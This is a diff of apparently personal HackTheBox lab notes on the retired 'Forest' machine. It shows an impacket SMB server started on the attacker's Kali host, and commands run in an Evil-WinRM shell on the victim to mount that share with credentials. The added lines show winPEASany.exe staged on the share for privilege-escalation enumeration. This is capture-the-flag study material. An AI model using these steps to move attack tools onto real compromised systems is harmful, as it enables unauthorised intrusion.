@@ -1,5 +1,5 @@
 # Uploading files to forest machine via smbserver
-First made a directory named `smb` , cd into that directory and run the command on kali machine `mpacket-smbserver clarkey $(pwd) -smb2support -user clark -password clark1234` to start smbserver in `smb` directory.
+First made a directory named `smb` , cd into that directory and run the command on kali machine `mpacket-smbserver clarkey $(pwd) -smb2support -user clark -password clark1234` to start smbserver in `smb` directory with new user `clark` and password `clark1234`.
 ```bash
 ~/Dropbox/Documents/htb/boxes/RETIRED_BOXES/forest_retired/smb ❯ impacket-smbserver clarkey(smbshare name) $(pwd){make present directory as share folder} -smb2support -user clark(username for smbshare) -password clark1234(password for smbshare) 
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
@@ -11,7 +11,7 @@ Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 [*] Config file parsed
 [*] Config file parsed
 ```
-Then ran following commands on victim(forest machine).
+Then ran following commands on victim(forest machine) so that we  can access `smb` folder on kali as `clark` folder on victim(forest machine) as smb share of new user created `clark` with share folder `clark`.
 ```powershell
 *Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> $pass = convertto-securestring 'clark1234' -AsPlainText -Force
 *Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> $pass
@@ -33,3 +33,16 @@ clark                                  FileSystem    \\10.10.14.105\clarkey
 
 *Evil-WinRM* PS C:\Users\svc-alfresco\Desktop>
 ```
+We have `smb` folder as `clark` folder in victim(forest)
+```powershell
+*Evil-WinRM* PS clark:\>ls
+
+
+    Directory: \\10.10.14.105\clarkey
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        7/27/2021   4:08 AM         441856 winPEASany.exe
+```
+
